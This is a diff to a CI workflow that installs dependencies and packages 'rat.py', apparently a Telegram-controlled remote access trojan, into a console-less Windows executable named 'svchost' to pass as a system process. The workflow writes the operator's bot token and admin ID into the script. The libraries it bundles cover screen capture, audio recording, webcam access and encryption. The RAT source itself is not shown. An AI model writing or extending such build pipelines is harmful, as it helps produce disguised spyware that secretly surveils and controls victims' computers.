@@ -29,7 +29,7 @@ jobs:
       - name: Install dependencies (32-bit compatible)
         run: |
           pip install pyinstaller gputil
-          pip install python-telegram-bot pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes
+          pip install python-telegram-bot pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes win10toast
       
       - name: Replace token and admin_id in rat.py
         run: |
@@ -37,7 +37,9 @@ jobs:
           import re
           with open('rat.py', 'r', encoding='utf-8') as f:
               content = f.read()
+          # Заменяем TOKEN (как есть)
           content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
+          # ADMIN_ID оборачиваем в int() для безопасности
           content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
           with open('rat.py', 'w', encoding='utf-8') as f:
               f.write(content)
@@ -45,7 +47,18 @@ jobs:
       
       - name: Build EXE (32-bit, без консоли)
         run: |
-          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --collect-all telegram --collect-all tkinter rat.py
+          pyinstaller --onefile --windowed --name "svchost" `
+            --hidden-import telegram --hidden-import telegram.ext `
+            --hidden-import PIL --hidden-import PIL.ImageGrab `
+            --hidden-import psutil --hidden-import requests `
+            --hidden-import sounddevice --hidden-import soundfile `
+            --hidden-import cryptography --hidden-import cryptography.fernet `
+            --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes `
+            --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil `
+            --hidden-import win10toast `
+            --collect-all tkinter --collect-all PIL `
+            --collect-all telegram `
+            rat.py
       
       - name: Upload EXE
         uses: actions/upload-artifact@v4
